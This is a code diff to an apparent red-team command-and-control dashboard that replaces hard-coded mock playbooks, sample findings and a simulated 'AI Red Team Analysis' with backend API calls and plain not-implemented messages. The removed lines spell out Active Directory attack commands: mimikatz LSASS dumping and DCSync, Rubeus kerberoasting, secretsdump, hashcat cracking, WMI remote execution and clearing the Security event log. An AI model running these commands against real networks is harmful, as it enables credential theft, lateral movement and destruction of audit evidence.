@@ -37,6 +37,8 @@ import {
   Server,
   Activity,
 } from 'lucide-react'
+import { findingsApi } from '../../api/findings'
+import { knowledgeGraphApi } from '../../api/knowledgeGraph'
 import { useC2Store } from '../../store/c2Store'
 import { useLOLStore } from '../../store/lolStore'
 import { useRealtimeStore } from '../../store/realtimeStore'
@@ -193,44 +195,7 @@ const BUILTIN_QUERIES: Neo4jQuery[] = [
   },
 ]
 
-const PLAYBOOK_TEMPLATES: Playbook[] = [
-  {
-    id: 'pb-1',
-    name: 'Initial Access → Domain Admin',
-    description: 'Full attack chain from initial foothold to domain admin',
-    status: 'draft',
-    tags: ['AD', 'privilege_escalation'],
-    steps: [
-      { id: 's1', name: 'Enumerate local users', command: 'net user', template: '' },
-      { id: 's2', name: 'Check domain info', command: 'nltest /domain_trusts', template: '' },
-      { id: 's3', name: 'Run BloodHound ingestor', command: 'SharpHound.exe -c All', template: '' },
-      { id: 's4', name: 'Dump LSASS', command: 'mimikatz "sekurlsa::logonpasswords"', template: '' },
-    ],
-  },
-  {
-    id: 'pb-2',
-    name: 'Kerberoasting Attack Chain',
-    description: 'Enumerate SPNs, request tickets, crack offline',
-    status: 'draft',
-    tags: ['kerberoast', 'credential_access'],
-    steps: [
-      { id: 's1', name: 'Find Kerberoastable accounts', command: 'GetUserSPNs.py -request', template: '' },
-      { id: 's2', name: 'Request service tickets', command: 'Rubeus.exe kerberoast /rc4opsec', template: '' },
-      { id: 's3', name: 'Save tickets to file', command: 'echo {output} > tickets.txt', template: '' },
-    ],
-  },
-  {
-    id: 'pb-3',
-    name: 'Lateral Movement via WMI',
-    description: 'Execute commands on remote hosts via WMI',
-    status: 'draft',
-    tags: ['lateral_movement', 'wmi'],
-    steps: [
-      { id: 's1', name: 'WMI command execution', command: 'wmic /node:{target} process call create "{cmd}"', template: '{target}' },
-      { id: 's2', name: 'Verify execution', command: 'wmic /node:{target} process list brief', template: '' },
-    ],
-  },
-]
+// PLAYBOOK_TEMPLATES removed — playbooks should be fetched from backend API when available
 
 // ---- Helper components ----
 
@@ -718,25 +683,9 @@ function PlaybooksTab({ playbooks, setPlaybooks }: { playbooks: Playbook[]; setP
   const [selected, setSelected] = useState<Playbook | null>(null)
   const [expandedSteps, setExpandedSteps] = useState<Set<string>>(new Set())
 
-  const runPlaybook = (id: string) => {
-    const runningPlaybooks = playbooks.map(p => p.id === id ? { ...p, status: 'running' as const, currentStep: 0 } : p)
-    setPlaybooks(runningPlaybooks)
-    // TODO: Replace simulated step execution with real backend playbook runner (POST /api/c2/playbooks/:id/run)
-    // Currently uses setInterval to fake step progression client-side
-    let step = 0
-    const interval = setInterval(() => {
-      step++
-      const updatedPlaybooks = runningPlaybooks.map(p => {
-        if (p.id !== id) return p
-        if (step >= p.steps.length) {
-          clearInterval(interval)
-          return { ...p, status: 'completed' as const, currentStep: p.steps.length }
-        }
-        return { ...p, currentStep: step }
-      })
-      setPlaybooks(updatedPlaybooks)
-      if (step >= (playbooks.find(p => p.id === id)?.steps.length ?? 0)) clearInterval(interval)
-    }, 2000)
+  const runPlaybook = (_id: string) => {
+    // No backend playbook runner exists yet (POST /api/c2/playbooks/:id/run)
+    alert('Playbook execution is not implemented — backend endpoint not available yet')
   }
 
   return (
@@ -887,10 +836,19 @@ function Neo4jTab() {
   const runQuery = useCallback((q: string) => {
     setRunning(true)
     setResults('')
-    setTimeout(() => {
-      setResults(`// Query results for: ${q.substring(0, 60)}...\n\n{\n  "nodes": [],\n  "relationships": [],\n  "stats": {\n    "nodes_created": 0,\n    "relationships_created": 0,\n    "properties_set": 0\n  },\n  "message": "Connected to Neo4j — run query to see results"\n}`)
-      setRunning(false)
-    }, 1500)
+    // Use knowledgeGraphApi.search — no raw Cypher endpoint exists yet
+    knowledgeGraphApi.search(q, undefined, 50)
+      .then(data => {
+        if (Array.isArray(data) && data.length > 0) {
+          setResults(JSON.stringify(data, null, 2))
+        } else {
+          setResults(`// No results for: ${q.substring(0, 60)}...\n// Neo4j graph is empty — run a mission to populate data`)
+        }
+      })
+      .catch(() => {
+        setResults('// Not connected — Neo4j / knowledge graph API is unavailable')
+      })
+      .finally(() => setRunning(false))
   }, [])
 
   return (
@@ -1094,26 +1052,30 @@ function ParsersTab({ parsers: _parsers, setParsers: _setParsers }: { parsers: L
 
 function SearchTab() {
   const [query, setQuery] = useState('')
-  const [results] = useState<Finding[]>([
-    {
-      id: 'f1', type: 'credential', severity: 'critical',
-      title: 'Plaintext Domain Admin Password Found',
-      detail: 'Domain admin credentials extracted from LSASS dump on WORKSTATION-01',
-      source: 'LSASS Parser', timestamp: new Date(Date.now() - 3600000).toISOString(),
-    },
-    {
-      id: 'f2', type: 'vulnerability', severity: 'high',
-      title: 'Kerberoastable Service Account: svc_sql',
-      detail: 'SPN: MSSQLSvc/db01.domain.local:1433 — Account has never had password changed',
-      source: 'Neo4j Query', timestamp: new Date(Date.now() - 7200000).toISOString(),
-    },
-    {
-      id: 'f3', type: 'recon', severity: 'medium',
-      title: 'DC-PRIMARY: Unconstrained Delegation Enabled',
-      detail: 'Domain controller has unconstrained Kerberos delegation — TGTs can be captured',
-      source: 'BloodHound', timestamp: new Date(Date.now() - 10800000).toISOString(),
-    },
-  ])
+  const [results, setResults] = useState<Finding[]>([])
+  const [loading, setLoading] = useState(false)
+  const [error, setError] = useState<string | null>(null)
+
+  // Fetch real findings from backend on mount
+  useEffect(() => {
+    setLoading(true)
+    findingsApi.list()
+      .then(data => {
+        const mapped = (Array.isArray(data) ? data : []).map(f => ({
+          id: f.id,
+          type: f.category || 'unknown',
+          severity: f.severity as Severity,
+          title: f.title,
+          detail: f.description,
+          source: f.tool || f.agentCodename || 'unknown',
+          timestamp: f.foundAt,
+        }))
+        setResults(mapped)
+        setError(null)
+      })
+      .catch(() => setError('Could not connect to findings API'))
+      .finally(() => setLoading(false))
+  }, [])
 
   const filtered = query
     ? results.filter(r => r.title.toLowerCase().includes(query.toLowerCase()) || r.detail.toLowerCase().includes(query.toLowerCase()))
@@ -1165,10 +1127,22 @@ function SearchTab() {
             </div>
           </motion.div>
         ))}
-        {filtered.length === 0 && (
+        {loading && (
+          <div className="text-center py-12 text-text-secondary">
+            <RefreshCw className="w-10 h-10 mx-auto mb-3 opacity-30 animate-spin" />
+            <p>Loading findings...</p>
+          </div>
+        )}
+        {error && !loading && (
+          <div className="text-center py-12 text-text-secondary">
+            <AlertTriangle className="w-10 h-10 mx-auto mb-3 opacity-30" />
+            <p>{error}</p>
+          </div>
+        )}
+        {!loading && !error && filtered.length === 0 && (
           <div className="text-center py-12 text-text-secondary">
             <Search className="w-10 h-10 mx-auto mb-3 opacity-30" />
-            <p>No results for "{query}"</p>
+            <p>{query ? `No results for "${query}"` : 'No findings — run a mission first'}</p>
           </div>
         )}
       </div>
@@ -1185,46 +1159,9 @@ function AnalysisTab({ findings, setFindings }: { findings: Finding[]; setFindin
     if (!prompt) return
     setAnalyzing(true)
     setAnalysis(null)
-    setTimeout(() => {
-      setAnalysis(`## AI Red Team Analysis
-
-**Target:** ${prompt}
-
-### Attack Surface Summary
-
-Based on the gathered intelligence, here are the key attack paths:
-
-**1. Kerberoasting → Lateral Movement**
-- svc_sql has an SPN and weak password policy
-- Crack ticket offline → reuse credentials for lateral movement
-- Estimated success probability: **HIGH**
-
-**2. Unconstrained Delegation → DCSync**
-- DC-PRIMARY has unconstrained delegation
-- If we compromise DC-PRIMARY, we can force other DCs to authenticate → capture TGTs
-- Use captured TGT to perform DCSync attack
-- Estimated success probability: **VERY HIGH**
-
-**3. Domain Admin Reuse**
-- Plaintext DA credentials in LSASS suggest password reuse
-- Check for matching hashes across all domain computers
-- Estimated success probability: **HIGH**
-
-### Recommended Next Steps
-
-1. \`Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt\`
-2. \`hashcat -a 0 -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\`
-3. If cracked: \`secretsdump.py domain/svc_sql:{pass}@dc01\`
-4. DCSync: \`mimikatz "lsadump::dcsync /domain:domain.local /all"\`
-
-### OPSEC Considerations
-
-- Use RC4 OPSEC flag for Kerberoast to avoid AES downgrade detection
-- Perform DCSync from non-DC machine to blend in
-- Clean event logs after lateral movement: \`wevtutil cl Security\`
-`)
-      setAnalyzing(false)
-    }, 3000)
+    // No backend AI analysis endpoint exists yet — show honest status
+    setAnalysis('AI analysis is not connected. Configure an AI model provider in Settings → AI Models to enable attack path analysis.')
+    setAnalyzing(false)
   }
 
   return (
@@ -2773,7 +2710,7 @@ export default function RedTeam() {
   const [c2Servers, setC2Servers] = useState<C2Server[]>([])
   const [sessions, setSessions] = useState<Session[]>([])
   const [tasks, setTasks] = useState<SocksTask[]>([])
-  const [playbooks, setPlaybooks] = useState<Playbook[]>(PLAYBOOK_TEMPLATES)
+  const [playbooks, setPlaybooks] = useState<Playbook[]>([])
   const [findings, setFindings] = useState<Finding[]>([])
   const [parsers, setParsers] = useState<LogParser[]>([])
 
